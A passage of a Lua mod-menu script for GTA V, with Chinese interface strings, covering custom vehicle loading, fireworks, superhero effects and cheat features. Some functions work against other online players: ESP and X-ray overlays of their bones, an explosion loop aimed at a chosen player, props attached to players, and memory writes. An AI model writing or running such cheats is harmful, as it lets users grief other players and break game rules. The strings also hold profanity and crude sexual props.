    VEHICLE.SET_VEHICLE_ENVEFF_SCALE(vehicle, colors['Paint Fade'])
    VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(vehicle, "LANCE")
end
local supported_jackz_versions = {'1.1.0', '1.3.0', '1.3.1', '1.4.0'}
function json_load_vehicle(path)
    local all_entities = {}
    local success = false
    local fp = io.open(path, "r")
    if not fp then 
        gtoast("打开错误了 他妈的 " .. path)
        return
    end
    local json_string = fp:read("*all")
    local json_tbl = lunajson.decode(json_string)
    if json_tbl.version ~= nil then 
        local disp_version = string.gsub(json_tbl.version, 'Jackz自定义载具 ', '')
        if not table.contains(supported_jackz_versions, disp_version) then 
            gtoast("兰斯Spooner不支持这个Jackz或JSON版本 (版本 " .. disp_version .. "). 正在加载此文件，有可能正常使用.如果此模组显示正常，请告诉我，已便我可以减少这类提示!")
        end
    else
        gtoast("这辆Jackz载具多久了你他妈还在用(或者这他妈就不是Jackz载具). 在尝试了 可能会失败哦.")
    end
    local base = json_tbl.base
    if base.model == nil then 
        gtoast(fail_text)
        return
    end
    local v_hash = base.model
    request_model_load(v_hash)
    local c = players.get_position(players.user())
    local initial_vehicle = entities.create_vehicle(v_hash, c, ENTITY.GET_ENTITY_HEADING(players.user_ped()))
    all_entities[#all_entities + 1] = initial_vehicle
    json_preprocess_vehicle(initial_vehicle, base, initial_vehicle)
    for k,o in pairs(json_tbl.objects) do 
        request_model_load(o.model)
        local this_obj = entities.create_object(o.model, c)
        all_entities[#all_entities + 1] = this_obj
        ENTITY.SET_ENTITY_VISIBLE(this_obj, o.visible, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(this_obj, initial_vehicle, 0, o.offset.x, o.offset.y, o.offset.z, o.rotation.x, o.rotation.y, o.rotation.z, true, false, true, false, 2, true)
    end
    if json_tbl.vehicles ~= nil then 
        for k,veh in pairs(json_tbl.vehicles) do 
            local v_hash = veh.model
            request_model_load(v_hash)
            local this_veh = entities.create_vehicle(v_hash, c, ENTITY.GET_ENTITY_HEADING(players.user_ped()))
            all_entities[#all_entities + 1] = this_veh
            json_preprocess_vehicle(this_veh, veh, initial_vehicle)
        end
    end
    success = true 
    if success then
        PED.SET_PED_INTO_VEHICLE(players.user_ped(), initial_vehicle, -1)
        local this_veh_root = menu.list(loaded_vehicles_root, path:gsub(vehicles_dir, ''), {"lancespoonerv" .. initial_vehicle}, "")
        local this_blip = HUD.ADD_BLIP_FOR_ENTITY(initial_vehicle)
        HUD.SET_BLIP_SPRITE(this_blip, 77)
        HUD.SET_BLIP_COLOUR(this_blip, 47)
        menu.action(this_veh_root, "删除", {"deletelancespoonerv" .. initial_vehicle}, "Delete this vehicle. Make it cease to exist.", function(on_click)
            for k,v in pairs(all_entities) do
                entities.delete_by_handle(v)
            end
            menu.delete(this_veh_root)
            util.remove_blip(this_blip)
        end)
        menu.action(this_veh_root, "传送至载具内", {"teleportejsonv" .. initial_vehicle}, "", function(on_click)
            PED.SET_PED_INTO_VEHICLE(PLAYER.PLAYER_PED_ID(), initial_vehicle, -1)
        end)
    else
        gtoast("发生了他妈的错误!这个JSON不能加载.滚 :'(")
    end
end
--拓展选项
CCAM = 0
STP_SPEED_MODIFIER = 0.02
STP_COORD_HEIGHT = 300
FRAME_STP = false
--preload
DR_TXT_SCALE = 0.5
--preload
EP_drawveh = true
EP_drawped = true
EP_drawobj = true
EP_drawpick = true
----
EPS_vehx = 0.0
EPS_vehy = 0.03
--
EPS_pedx = 0.0
EPS_pedy = 0.05
--
EPS_objx = 0.0
EPS_objy = 0.07
--
EPS_pickx = 0.0
EPS_picky = 0.09
--
function GetLocalPed()
    return PLAYER.PLAYER_PED_ID()
end
function onStartup()
    SE_LocalPed = GetLocalPed()
end
onStartup()
local function request_ptfx_asset_firework(asset)
    local request_time = os.time()
    STREAMING.REQUEST_NAMED_PTFX_ASSET(asset)
    while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(asset) do
        if os.time() - request_time >= 10 then
            break
        end
        wait()
    end
end
local placed_firework_boxes = {}
function placefirework()
    local animlib = 'anim@mp_fireworks'
    local ptfx_asset = "scr_indep_fireworks"
    local anim_name = 'place_firework_3_box'
    local effect_name = "scr_indep_firework_trailburst"
    request_anim_dict(animlib)
    local pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), 0.0, 0.52, 0.0)
    local ped = players.user_ped()
    ENTITY.FREEZE_ENTITY_POSITION(ped, true)
    TASK.TASK_PLAY_ANIM(ped, animlib, anim_name, -1, -8.0, 3000, 0, 0, false, false, false)
    wait(1500)
    local firework_box = entities.create_object(util.joaat('ind_prop_firework_03'), pos, true, false, false)
    local firework_box_pos = ENTITY.GET_ENTITY_COORDS(firework_box)
    OBJECT.PLACE_OBJECT_ON_GROUND_PROPERLY(firework_box)
    ENTITY.FREEZE_ENTITY_POSITION(ped, false)
    wait(1000)
    ENTITY.FREEZE_ENTITY_POSITION(firework_box, true)
    placed_firework_boxes[#placed_firework_boxes + 1] = firework_box
end
function fireworkshow()
    if #placed_firework_boxes == 0 then 
        notification("先放烟花！", colors.blue)
        return 
    end
    local ptfx_asset = "scr_indep_fireworks"
    local effect_name = "scr_indep_firework_trailburst"
    request_ptfx_asset_firework(ptfx_asset)
    notification("烟花!!!", colors.blue)
    for i=1, 50 do
        for k,box in pairs(placed_firework_boxes) do 
            GRAPHICS.USE_PARTICLE_FX_ASSET(ptfx_asset)
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_ON_ENTITY(effect_name, box, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, 1.0, 0.0, 0.0, 0.0)
            wait(100)
        end
    end
    for k,box in pairs(placed_firework_boxes) do 
        entities.delete_by_handle(box)
        placed_firework_boxes[box] = nil
    end
end
function autocover()
    local health = ENTITY.GET_ENTITY_HEALTH(players.user_ped())
    if ENTITY.GET_ENTITY_MAX_HEALTH(players.user_ped()) == health then return end
    ENTITY.SET_ENTITY_HEALTH(players.user_ped(), health + 5, 0)
    wait(255)
end
function notifyhealth()
    local player_maxhealth = PED.GET_PED_MAX_HEALTH(PLAYER.PLAYER_PED_ID())
    local player_currenthealth = ENTITY.GET_ENTITY_HEALTH(PLAYER.PLAYER_PED_ID())
    gtoast("当前血量：" .. player_currenthealth .. "\n最大血量：" .. player_maxhealth)
end
function notifyarmor()
    local player_currentarmour = PED.GET_PED_ARMOUR(PLAYER.PLAYER_PED_ID())
    local player_maxarmour = PLAYER.GET_PLAYER_MAX_ARMOUR(PLAYER.PLAYER_ID())
    gtoast("当前护甲：" .. player_currentarmour .. "\n最大护甲：" .. player_maxarmour)
end
function Streamptfx(lib)
    STREAMING.REQUEST_NAMED_PTFX_ASSET(lib)
    while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(lib) do
        wait()
    end
    GRAPHICS.USE_PARTICLE_FX_ASSET(lib)
end
    function Player_rotate()
        local CV = CAM.GET_GAMEPLAY_CAM_COORD()
        local rot = CAM.GET_GAMEPLAY_CAM_ROT(0)
        local he = MISC.GET_HEADING_FROM_VECTOR_2D(CV.x, CV.y)
        ENTITY.SET_ENTITY_HEADING(players.user_ped(), he)
        ENTITY.SET_ENTITY_ROTATION(players.user_ped(), rot.x, rot.y, rot.z, 0, true)
    end
    function Leyes(lazer, impact, camrot, weap)
        local reye, leye
        Player_rotate()
        if util.is_session_started() then
            reye = ENTITY.GET_WORLD_POSITION_OF_ENTITY_BONE(players.user_ped(), PED.GET_PED_BONE_INDEX(players.user_ped(), 0x6b52))
            leye = ENTITY.GET_WORLD_POSITION_OF_ENTITY_BONE(players.user_ped(), PED.GET_PED_BONE_INDEX(players.user_ped(), 0x62ac))
        else
            reye = ENTITY.GET_WORLD_POSITION_OF_ENTITY_BONE(players.user_ped(), PED.GET_PED_BONE_INDEX(players.user_ped(), 6468))
            leye = ENTITY.GET_WORLD_POSITION_OF_ENTITY_BONE(players.user_ped(), PED.GET_PED_BONE_INDEX(players.user_ped(), 5956))
        end
        local cama = {}
        cama.x, cama.y, cama.z = Cama()
        if lazer.exp then
            if WEAPON.GET_PED_LAST_WEAPON_IMPACT_COORD(players.user_ped(), memory.addrof(impact)) then
                FIRE.ADD_EXPLOSION(impact.x, impact.y, impact.z, 81, 5000, true, false, 0.0, false)
            end
        end
        Streamptfx('weap_xs_weapons')
        camrot.x += 90
        camrot.y += 180
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD('bullet_tracer_xs_sr', reye.x, reye.y, reye.z, camrot.x, camrot.y,  camrot.z, 1, true)
        Streamptfx('weap_xs_weapons')
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD('bullet_tracer_xs_sr', leye.x, leye.y, leye.z, camrot.x, camrot.y,  camrot.z, 1, true)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY(reye.x, reye.y, reye.z, cama.x, cama.y,  cama.z , 200, 0, weap, players.user_ped(), true, false, 1000, players.user_ped())
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY(leye.x, leye.y, leye.z, cama.x, cama.y,  cama.z, 200, 0, weap, players.user_ped(), true, false, 1000, players.user_ped())
    end
    function Cama()
        local inst = v3.new()
        local cama = {}
        v3.set(inst,CAM.GET_FINAL_RENDERED_CAM_ROT(2))
        local tmp = v3.toDir(inst)
        v3.set(inst, v3.get(tmp))
        v3.mul(inst, 1000)
        v3.set(tmp, CAM.GET_FINAL_RENDERED_CAM_COORD())
        v3.add(inst, tmp)
        cama.x, cama.y, cama.z = v3.get(inst)
        return cama.x, cama.y, cama.z
    end
function Xraytarget(xray, aim_target, rgb)
    if xray.espline then
        Draw_esp(aim_target, rgb)
    end
    if xray.espbox then
        local color = {
            r = rgb.color.r * 255,
            g = rgb.color.g * 255,
            b = rgb.color.b * 255,
            a = rgb.color.a * 255
        }
        draw_bounding_box(aim_target, color)
    end
    if xray.espbones then
        Bone_Esp(aim_target, SuperESPrgb)  
    end
end
function Bone_Esp (aim_target, rgb)
    hxcoor,hycoor,nxcoor,nycoor,lexcoor,leycoor,rexcoor,reycoor,lhxcoor,lhycoor,
    rhxcoor,rhycoor,pxcoor,pycoor,lkxcoor,lkycoor,rkxcoor,rkycoor,lfxcoor,lfycoor,rfxcoor,rfycoor = 
    memory.alloc(4),memory.alloc(4),memory.alloc(4),memory.alloc(4),memory.alloc(4),memory.alloc(4),memory.alloc(4),memory.alloc(4),memory.alloc(4),memory.alloc(4),memory.alloc(4),
    memory.alloc(4),memory.alloc(4),memory.alloc(4),memory.alloc(4),memory.alloc(4),memory.alloc(4),memory.alloc(4),memory.alloc(4),memory.alloc(4),memory.alloc(4),memory.alloc(4)
        local head = ENTITY.GET_WORLD_POSITION_OF_ENTITY_BONE(aim_target, PED.GET_PED_BONE_INDEX(aim_target, 0x796E))
        local neck = ENTITY.GET_WORLD_POSITION_OF_ENTITY_BONE(aim_target, PED.GET_PED_BONE_INDEX(aim_target, 0x9995))
        local left_elbow = ENTITY.GET_WORLD_POSITION_OF_ENTITY_BONE(aim_target, PED.GET_PED_BONE_INDEX(aim_target, 0x58b7))
        local right_elbow = ENTITY.GET_WORLD_POSITION_OF_ENTITY_BONE(aim_target, PED.GET_PED_BONE_INDEX(aim_target, 0xbb0))
        local left_hand = ENTITY.GET_WORLD_POSITION_OF_ENTITY_BONE(aim_target, PED.GET_PED_BONE_INDEX(aim_target, 0x49d9))
        local right_hand = ENTITY.GET_WORLD_POSITION_OF_ENTITY_BONE(aim_target, PED.GET_PED_BONE_INDEX(aim_target, 0xdead))
        local pelvis = ENTITY.GET_WORLD_POSITION_OF_ENTITY_BONE(aim_target, PED.GET_PED_BONE_INDEX(aim_target, 0x60F0))
        local left_knee = ENTITY.GET_WORLD_POSITION_OF_ENTITY_BONE(aim_target, PED.GET_PED_BONE_INDEX(aim_target, 0xb3fe))
        local right_knee = ENTITY.GET_WORLD_POSITION_OF_ENTITY_BONE(aim_target, PED.GET_PED_BONE_INDEX(aim_target, 0x3fcf))
        local left_foot = ENTITY.GET_WORLD_POSITION_OF_ENTITY_BONE(aim_target, PED.GET_PED_BONE_INDEX(aim_target, 0x3779))
        local right_foot = ENTITY.GET_WORLD_POSITION_OF_ENTITY_BONE(aim_target, PED.GET_PED_BONE_INDEX(aim_target, 0xcc4d))
        GRAPHICS.GET_SCREEN_COORD_FROM_WORLD_COORD(head.x, head.y, head.z, hxcoor, hycoor)
        GRAPHICS.GET_SCREEN_COORD_FROM_WORLD_COORD(neck.x, neck.y, neck.z, nxcoor, nycoor)
        GRAPHICS.GET_SCREEN_COORD_FROM_WORLD_COORD(left_elbow.x, left_elbow.y, left_elbow.z, lexcoor, leycoor)
        GRAPHICS.GET_SCREEN_COORD_FROM_WORLD_COORD(right_elbow.x, right_elbow.y, right_elbow.z, rexcoor, reycoor)
        GRAPHICS.GET_SCREEN_COORD_FROM_WORLD_COORD(left_hand.x, left_hand.y, left_hand.z, lhxcoor, lhycoor)
        GRAPHICS.GET_SCREEN_COORD_FROM_WORLD_COORD(right_hand.x, right_hand.y, right_hand.z, rhxcoor, rhycoor)
        GRAPHICS.GET_SCREEN_COORD_FROM_WORLD_COORD(pelvis.x, pelvis.y, pelvis.z, pxcoor, pycoor)
        GRAPHICS.GET_SCREEN_COORD_FROM_WORLD_COORD(left_knee.x, left_knee.y, left_knee.z, lkxcoor, lkycoor)
        GRAPHICS.GET_SCREEN_COORD_FROM_WORLD_COORD(right_knee.x, right_knee.y, right_knee.z, rkxcoor, rkycoor)
        GRAPHICS.GET_SCREEN_COORD_FROM_WORLD_COORD(left_foot.x, left_foot.y, left_foot.z, lfxcoor, lfycoor)
        GRAPHICS.GET_SCREEN_COORD_FROM_WORLD_COORD(right_foot.x, right_foot.y, right_foot.z, rfxcoor, rfycoor)
        directx.draw_line(memory.read_float(hxcoor), memory.read_float(hycoor), memory.read_float(nxcoor), memory.read_float(nycoor), rgb.color)
        directx.draw_line(memory.read_float(lexcoor), memory.read_float(leycoor), memory.read_float(nxcoor), memory.read_float(nycoor), rgb.color)
        directx.draw_line(memory.read_float(rexcoor), memory.read_float(reycoor), memory.read_float(nxcoor), memory.read_float(nycoor), rgb.color)
        directx.draw_line(memory.read_float(lexcoor), memory.read_float(leycoor), memory.read_float(lhxcoor), memory.read_float(lhycoor), rgb.color)
        directx.draw_line(memory.read_float(rexcoor), memory.read_float(reycoor), memory.read_float(rhxcoor), memory.read_float(rhycoor), rgb.color)
        directx.draw_line(memory.read_float(nxcoor), memory.read_float(nycoor),  memory.read_float(pxcoor), memory.read_float(pycoor), rgb.color) 
        directx.draw_line(memory.read_float(lkxcoor), memory.read_float(lkycoor),  memory.read_float(pxcoor), memory.read_float(pycoor), rgb.color)
        directx.draw_line(memory.read_float(rkxcoor), memory.read_float(rkycoor),  memory.read_float(pxcoor), memory.read_float(pycoor), rgb.color)
        directx.draw_line(memory.read_float(lkxcoor), memory.read_float(lkycoor),  memory.read_float(lfxcoor), memory.read_float(lfycoor), rgb.color)
        directx.draw_line(memory.read_float(rkxcoor), memory.read_float(rkycoor),  memory.read_float(rfxcoor), memory.read_float(rfycoor), rgb.color)
end
function Super_Breath(superman)
    Player_rotate()
    local offset = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), 0, 5, 0)
    local offset2 = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), 0, 10, 0)
    for i = 0, superman.breath do
        FIRE.ADD_EXPLOSION(offset.x, offset.y, offset.z, 81, 5000, false, true, 0.0, superman.nodam)
        FIRE.ADD_EXPLOSION(offset2.x, offset2.y, offset2.z, 81, 5000, false, true, 0.0, superman.nodam)
    end
end
function Draw_esp(ped, rgb) --credits to Totaw Annihiwation
    local screenX = memory.alloc(4)
    local screenY = memory.alloc(4)
    local pos = ENTITY.GET_ENTITY_COORDS(ped)
    GRAPHICS.GET_SCREEN_COORD_FROM_WORLD_COORD(pos.x, pos.y, pos.z, screenX, screenY)
    directx.draw_line(0.5, 0.5, memory.read_float(screenX), memory.read_float(screenY), rgb.color) 
end
xrtarget = true
function Xrayvision(xray)
    local ped_hndles = entities.get_all_peds_as_handles()
    for ped_hndles as ped do
        if players.user_ped() != ped and not PED.IS_PED_DEAD_OR_DYING(ped, 1) and ENTITY.DOES_ENTITY_EXIST(ped) then
            local ped_coor = ENTITY.GET_ENTITY_COORDS(ped, true)
            local player_coor = ENTITY.GET_ENTITY_COORDS(players.user_ped(), true)
            local disbet = SYSTEM.VDIST2(ped_coor.x, ped_coor.y, ped_coor.z, player_coor.x, player_coor.y, player_coor.z)
            local too_far = 600000
            if not PED.IS_PED_FACING_PED(players.user_ped(), ped, xray.fov) then
                xrtarget = false
            else
                xrtarget = true
            end
            if disbet >= too_far then
                xrtarget = false
            end
            if PED.IS_PED_A_PLAYER(ped) and not xray.players then
                xrtarget = false
            end
            if not PED.IS_PED_A_PLAYER(ped) and not xray.npcs then
                xrtarget = false
            end
            if PED.IS_PED_IN_ANY_VEHICLE(ped, true) and not xray.targetveh then
                xrtarget = false
            end
            local handle_ptr = memory.alloc(13*8)
            local function pid_to_handle(pid)--credits to lance
                NETWORK.NETWORK_HANDLE_FROM_PLAYER(pid, handle_ptr, 13)
                return handle_ptr
            end
            if PED.IS_PED_A_PLAYER(ped) and xray.players and not xray.friends then
                local pid = NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(ped)
                local hdl = pid_to_handle(pid)
                if NETWORK.NETWORK_IS_FRIEND(hdl) then
                    xrtarget = false
                end
            end
            if xrtarget and PAD.IS_CONTROL_PRESSED(0, 119) then
                xray_target = ped
                Xraytarget(xray, xray_target, SuperESPrgb)
            else 
                xray_target = 0
            end
        end
    end
    return xray_target
end
function Hexarobi_translate(text)
    local translated_string = translations.current_translations[text]
    if translated_string ~= nil and translated_string ~= LANG_STRING_NOT_FOUND then
        --debug_log("Found local translation for '"..text.."'")
        return translated_string
    end
    local label_id = lang.find(text, "en")
    if label_id then
        --debug_log("Found global translation for '"..text.."'")
        translated_string = lang.get_string(label_id, lang.get_current())
        if translated_string ~= LANG_STRING_NOT_FOUND then
            return translated_string
        end
    else
        --debug_log("Missing translation: "..text)
        translations.missing_translations[text] = text
    end
    return text
end
function Str_trans(string)
    return lang.get_string(Hexarobi_translate(string), lang.get_current())
end
function Hudhide()
    HUD.HIDE_HUD_COMPONENT_THIS_FRAME(6)
    HUD.HIDE_HUD_COMPONENT_THIS_FRAME(7)
    HUD.HIDE_HUD_COMPONENT_THIS_FRAME(8)
    HUD.HIDE_HUD_COMPONENT_THIS_FRAME(9)
---@diagnostic disable-next-line: param-type-mismatch
    memory.write_int(memory.script_global(1645739+1121), 1)
    sf.CLEAR_ALL()
    sf.TOGGLE_MOUSE_BUTTONS(false)
end
    function Supereyes(lazer, impact, camrot, weap)
        local reye, leye
        if lazer.exp then
            if WEAPON.GET_PED_LAST_WEAPON_IMPACT_COORD(players.user_ped(), memory.addrof(impact)) then
                FIRE.ADD_EXPLOSION(impact.x, impact.y, impact.z, 81, 5000, true, false, 0.0, false)
            end
        end
        Streamptfx('weap_xs_weapons')
        camrot.x += 90
        camrot.y += 180
        if util.is_session_started() then
            reye = ENTITY.GET_WORLD_POSITION_OF_ENTITY_BONE(players.user_ped(), PED.GET_PED_BONE_INDEX(players.user_ped(), 0x6b52))
            leye = ENTITY.GET_WORLD_POSITION_OF_ENTITY_BONE(players.user_ped(), PED.GET_PED_BONE_INDEX(players.user_ped(), 0x62ac))
        else
            reye = ENTITY.GET_WORLD_POSITION_OF_ENTITY_BONE(players.user_ped(), PED.GET_PED_BONE_INDEX(players.user_ped(), 6468))
            leye = ENTITY.GET_WORLD_POSITION_OF_ENTITY_BONE(players.user_ped(), PED.GET_PED_BONE_INDEX(players.user_ped(), 5956))
        end
        local cama = {}
        cama.x, cama.y, cama.z = Cama()
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD('bullet_tracer_xs_sr', reye.x, reye.y, reye.z, camrot.x, camrot.y,  camrot.z, 1, true)
        Streamptfx('weap_xs_weapons')
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD('bullet_tracer_xs_sr', leye.x, leye.y, leye.z, camrot.x, camrot.y,  camrot.z, 1, true)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY(reye.x, reye.y, reye.z, cama.x, cama.y,  cama.z, 200, 0, weap, players.user_ped(), true, false, 1000, players.user_ped())
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY(leye.x, leye.y, leye.z, cama.x, cama.y,  cama.z, 200, 0, weap, players.user_ped(), true, false, 1000, players.user_ped())
        Player_rotate()
    end
function SF() --Scaleform Full credits to aaron
    Hudhide()
    sf.SET_DATA_SLOT(0,PAD.GET_CONTROL_INSTRUCTIONAL_BUTTONS_STRING(0, 86, true), Str_trans('Push Away or Blow up'))
    sf.addButton(PAD.GET_CONTROL_INSTRUCTIONAL_BUTTONS_STRING(0, 76, true))
    sf.SET_DATA_SLOT(2,PAD.GET_CONTROL_INSTRUCTIONAL_BUTTONS_STRING(0, 88, true) , Str_trans("Yeet"))
    sf.DRAW_INSTRUCTIONAL_BUTTONS()
    sf:draw_fullscreen()
end
function SFlsd() 
    Hudhide()
    sf.SET_DATA_SLOT(0,PAD.GET_CONTROL_INSTRUCTIONAL_BUTTONS_STRING(0, 86, true), Str_trans('Lazers'))
    sf.DRAW_INSTRUCTIONAL_BUTTONS()
    sf:draw_fullscreen()
end
function SFleaim() 
    Hudhide()
    sf.SET_DATA_SLOT(0,PAD.GET_CONTROL_INSTRUCTIONAL_BUTTONS_STRING(0, 25, true), Str_trans('Lazer Eyes'))
    sf.DRAW_INSTRUCTIONAL_BUTTONS()
    sf:draw_fullscreen()
end
function SFlepickup() 
    Hudhide()
    sf.SET_DATA_SLOT(0,PAD.GET_CONTROL_INSTRUCTIONAL_BUTTONS_STRING(0, 46, true), Str_trans('Lazer Eyes'))
    sf.DRAW_INSTRUCTIONAL_BUTTONS()
    sf:draw_fullscreen()
end
function SFlevaim() 
    Hudhide()
    sf.SET_DATA_SLOT(0,PAD.GET_CONTROL_INSTRUCTIONAL_BUTTONS_STRING(0, 68, true), Str_trans('Lazer Eyes'))
    sf.DRAW_INSTRUCTIONAL_BUTTONS()
    sf:draw_fullscreen()
end
function SFlevhorn() 
    Hudhide()
    sf.SET_DATA_SLOT(0,PAD.GET_CONTROL_INSTRUCTIONAL_BUTTONS_STRING(0, 86, true), Str_trans('Lazer Eyes'))
    sf.DRAW_INSTRUCTIONAL_BUTTONS()
    sf:draw_fullscreen()
end
function SFfly()
    Hudhide()
    sf.SET_DATA_SLOT(2,PAD.GET_CONTROL_INSTRUCTIONAL_BUTTONS_STRING(0, 76, true), Str_trans('Fly forward or backward twice as fast'))
    sf.SET_DATA_SLOT(1,PAD.GET_CONTROL_INSTRUCTIONAL_BUTTONS_STRING(0, 88, true), Str_trans('Backward'))
    sf.SET_DATA_SLOT(0,PAD.GET_CONTROL_INSTRUCTIONAL_BUTTONS_STRING(0, 87, true), Str_trans('Forward'))
    sf.DRAW_INSTRUCTIONAL_BUTTONS()
    sf:draw_fullscreen()
end
function SFfly2()
    Hudhide()
    sf.SET_DATA_SLOT(6,PAD.GET_CONTROL_INSTRUCTIONAL_BUTTONS_STRING(0, 62, true), Str_trans('Down'))
    sf.SET_DATA_SLOT(5,PAD.GET_CONTROL_INSTRUCTIONAL_BUTTONS_STRING(0, 61, true), Str_trans('Up'))
    sf.SET_DATA_SLOT(4,PAD.GET_CONTROL_INSTRUCTIONAL_BUTTONS_STRING(0, 34, true), Str_trans('Left'))
    sf.SET_DATA_SLOT(3,PAD.GET_CONTROL_INSTRUCTIONAL_BUTTONS_STRING(0, 35, true), Str_trans('Right'))
    sf.SET_DATA_SLOT(2,PAD.GET_CONTROL_INSTRUCTIONAL_BUTTONS_STRING(0, 76, true), Str_trans('Fly forward or backward twice as fast'))
    sf.SET_DATA_SLOT(1,PAD.GET_CONTROL_INSTRUCTIONAL_BUTTONS_STRING(0, 88, true), Str_trans('Backward'))
    sf.SET_DATA_SLOT(0,PAD.GET_CONTROL_INSTRUCTIONAL_BUTTONS_STRING(0, 87, true), Str_trans('Forward'))
    sf.DRAW_INSTRUCTIONAL_BUTTONS()
    sf:draw_fullscreen()
end
function SFsuper()
    Hudhide()
    sf.SET_DATA_SLOT(0,PAD.GET_CONTROL_INSTRUCTIONAL_BUTTONS_STRING(0, 22, true), Str_trans('Fly Upwards'))
    sf.SET_DATA_SLOT(1,PAD.GET_CONTROL_INSTRUCTIONAL_BUTTONS_STRING(0, 25, true), Str_trans('Lazer Eyes'))
    sf.addButton(PAD.GET_CONTROL_INSTRUCTIONAL_BUTTONS_STRING(0, 22, true))
    sf.SET_DATA_SLOT(3,PAD.GET_CONTROL_INSTRUCTIONAL_BUTTONS_STRING(0, 32, true), Str_trans('Fly Downwards'))
    sf.addButton(PAD.GET_CONTROL_INSTRUCTIONAL_BUTTONS_STRING(0, 22, true))
    sf.SET_DATA_SLOT(5,PAD.GET_CONTROL_INSTRUCTIONAL_BUTTONS_STRING(0, 33, true), Str_trans('Fly faster'))
    sf.SET_DATA_SLOT(6,PAD.GET_CONTROL_INSTRUCTIONAL_BUTTONS_STRING(0, 44, true), Str_trans('Land'))
    sf.SET_DATA_SLOT(7,PAD.GET_CONTROL_INSTRUCTIONAL_BUTTONS_STRING(0, 73, true), Str_trans('Super Breath'))
    sf.SET_DATA_SLOT(8,PAD.GET_CONTROL_INSTRUCTIONAL_BUTTONS_STRING(0, 119, true), Str_trans('X-Ray Vision'))
    sf.DRAW_INSTRUCTIONAL_BUTTONS()
    sf:draw_fullscreen()
end
obj_pp = {"prop_cs_dildo_01", "prop_ld_bomb_01", "prop_sam_01", "prop_mk_plane"}
opt_pp = {"小鸡巴", "大鸡巴", "超级鸡巴","小鸡巴V2", "删除"}
function getbigjb(index, value, click_type)
    pluto_switch index do
    case 1:
        attach_to_player("prop_cs_dildo_01", 57597, -0.1, 0.15, 0, 0, 90, 90)
        break
    case 2:
        attach_to_player("prop_ld_bomb_01", 57597, -0.1, 0.6, 0, 0, 180, 180)
        break
    case 3:
        attach_to_player("prop_sam_01", 57597, -0.1, 1.7, 0, 0, 180, 180)
        break
    case 4:
        attach_to_player("prop_mk_plane", 57597, -0.25, 0.55, 0, 0, -90, 180)
        break
    case 5:
        for k, model in pairs(obj_pp) do 
            delete_object(model)
        end
        break
    end
end
function ufffo()
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    local r = num[math.random(#num)]
    c.x = math.random(0.0,1.0) >= 0.5 and c.x + r + 5 or c.x - r - 5 
    c.y = math.random(0.0,1.0) >= 0.5 and c.y + r + 5 or c.y - r - 5 
    c.z = c.z + r + 8
    STREAMING.REQUEST_MODEL(ufo)
    while not STREAMING.HAS_MODEL_LOADED(ufo) do
        STREAMING.REQUEST_MODEL(ufo)
        wait()
    end
    wait(2500)
    local spawnedufo = entities.create_object(ufo, c) 
    wait(500)
    local ufoc = ENTITY.GET_ENTITY_COORDS(spawnedufo) 
    local success, floorcoords
    repeat
        success, floorcoords = util.get_ground_z(ufoc.x, ufoc.y) 
        wait()
    until success
    FIRE.ADD_EXPLOSION(ufoc.x, ufoc.y, floorcoords, 1, 100.0, true, false, 1.0, false) 
    wait(1500)
    entities.delete_by_handle(spawnedufo) 
    if not STREAMING.HAS_MODEL_LOADED(ufo) then
        notification("无法加载模型")
    end
end
--外星人爆炸循环
function alien_explosion_loop(pid) 
    local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local c = ENTITY.GET_ENTITY_COORDS(p)
    STREAMING.REQUEST_MODEL(ufo)
    while not STREAMING.HAS_MODEL_LOADED(ufo) do
        STREAMING.REQUEST_MODEL(ufo)
        wait()
    end
    c.z = c.z + 10
    local spawnedufo = entities.create_object(ufo, c) 
    wait(10)
    c = ENTITY.GET_ENTITY_COORDS(p)
    FIRE.ADD_EXPLOSION(c.x, c.y, c.z, 1, 100.0, true, false, 3.0, false)
    wait(1000)
    entities.delete_by_handle(spawnedufo)
    menu.trigger_commands("freeze".. players.get_name(pid).. " off")
end
function text_func(num)
	local floor = math.floor(num)
	if floor >= num - 0.4999999999 then
		return floor
	else
		return math.ceil(num)
	end
end
v2 = function (x, y)
	local inst = {x = x, y = y}
	setmetatable(inst, v2_meta)
	return inst
end
get_ground_z = function (vec)
    return util.get_ground_z(vec.x, vec.y)
end
function get_v3_of_v2(PosV2)
	local pos = select(2, worldprobe.raycast(v3(PosV2.x, PosV2.y, 800), v3(PosV2.x, PosV2.y, -100), -1, player.get_player_ped(player.player_id())))
	return pos + v3(0, 0, 1)
end
set_scaleform_movie_as_no_longer_needed = function(h)
    local pH = memory.alloc_int()
    memory.write_int(pH, h)
    GRAPHICS.SET_SCALEFORM_MOVIE_AS_NO_LONGER_NEEDED(pH)
end
function request_control(entity, timeOut)
    if not ENTITY.DOES_ENTITY_EXIST(entity) then
        return false
    end
    timeOut = timeOut or 500
    local start = newTimer()
    while not request_control_once(entity) and start.elapsed() < timeOut do
        wait()
    end
    return start.elapsed() < timeOut
end
function GetControl(vic, spec, pid)
    if pid == playerid then
        return
    end    
    if not players.exists(pid) then
        util.stop_thread()
    end
    local tick = 0
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vic)
    while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(vic) do
        local nid = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(vic)
